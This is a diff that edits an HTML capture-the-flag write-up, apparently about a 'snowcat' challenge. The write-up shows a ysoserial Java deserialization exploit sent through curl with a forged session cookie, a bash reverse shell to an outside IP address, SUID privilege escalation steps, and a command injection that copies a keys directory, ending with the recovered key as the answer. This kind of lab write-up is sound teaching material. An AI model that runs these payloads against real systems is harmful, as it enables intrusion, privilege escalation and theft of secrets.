@@ -87,8 +87,6 @@ Using a nonexistent URL (http://localhost/nonexistant), an error message was tri
 <p>
 Using the payload below and changing the target gadget, identified that the CommonsCollections6 gadget could effectively be used to deliver a payload. The initial approach was to touch a file in the /tmp directory to confirm a successful attack.
 <br>
-Payload details:
-<br>
 </p>
 <pre><code class="language-sh">
 java -jar /home/user/ysoserial.jar CommonsCollections6 'touch /tmp/pwned' > payload.bin
@@ -98,7 +96,7 @@ curl -s -H "Cookie: JSESSIONID=.${SESSION_ID}" "http://localhost/" > /dev/null
 ls -la /tmp/pwned 2>/dev/null && echo "SUCCESS with touch!" || echo "Failed"
 </code></pre>
 <p>
-The initial payload was delivered and successful:
+The payload resulted in "Success with Touch", indicating success.
 <br>
 </p>
 <p>
@@ -106,25 +104,25 @@ The initial payload was delivered and successful:
 <br>
 </p>
 <p>
-To achieve a remote shell, the following approach was used:
+The next step is to achieve a remote shell access to the target system. The following is the approach:
 <br>
 </p>
 <ol>
 <li>Setup a linux machine in linode, and start a netcat listener on port 4444</li>
 <li>As the low level user, create a shell code in the /tmp directory</li>
 <li>Change permissions on the file to allow other users to access and execute</li>
-<li>Send a payload to set the SUID on the shell file</li>
+<li>Send a payload to set the SUID on the shell file, allowing it to run with elevated permissions</li>
 <li>Send a payload that uses setsid to detach the process completely from the invoking script and run the shell</li>
 </ol>
 <p>
-The shell file used was:
+The file contained the following code to create a shell.
 <br>
 </p>
 <pre><code class="language-sh">
 bash -i >& /dev/tcp/69.164.211.205/4444 0>&1
 </code></pre>
 <p>
-The payload used to set the SUID was:
+Next, the following payload sent that set the SUID of the shell file.
 <br>
 </p>
 <pre><code class="language-sh">
@@ -141,7 +139,7 @@ Initial payloads failed, due to the payload script completing before the shell w
 <br>
 </p>
 <p>
-The payload used setid and ran the shell was:
+The following payload used setid and execute the payload, establishing shell access to the target.
 <br>
 </p>
 <pre><code class="language-sh">
@@ -154,7 +152,7 @@ curl -s -X PUT -H "Content-Length: $(wc -c < payload.bin)" -H "Content-Range: by
 curl -s -H "Cookie: JSESSIONID=.${SESSION_ID}" "http://localhost/" > /dev/null
 </code></pre>
 <p>
-This resulted in access as the identity running the web service:
+This resulted in system access with the privileges the web service.
 <br>
 </p>
 <p>
@@ -190,14 +188,14 @@ The weather user has access to the /usr/local/weather/keys directory. This was o
 <br>
 </p>
 <p>
-The following command was injected into the binary command line to create a file containing the contents of the keys folder and change the file permissions:
+The following command was injected into the binary command line.  This created a file containing the contents of the keys folder and changed the file permissions to grant read access.
 <br>
 </p>
 <pre><code class="language-">
 /usr/local/weather/temperature "4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6';cat /usr/local/weather/keys/* > /tmp/keys.txt;chmod 644 /tmp/keys.txt;echo '"
 </code></pre>
 <p>
-Viewing the contents of the file revealed:
+The first key listed is the one used with the temperature binary. The second key is not used by snowcat.
 <br>
 </p>
 <pre><code class="language-">
@@ -205,10 +203,7 @@ cat /tmp/keys.txt
 4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6
 8ade723d-9968-45c9-9c33-7606c49c2201
 </code></pre>
-<p>
-The first key listed is the one used with the temperature binary. The second key is not used by snowcat.
-<br>
-</p>
+
 <p>
 <strong>Answer: 8ade723d-9968-45c9-9c33-7606c49c2201</strong>
 <br>
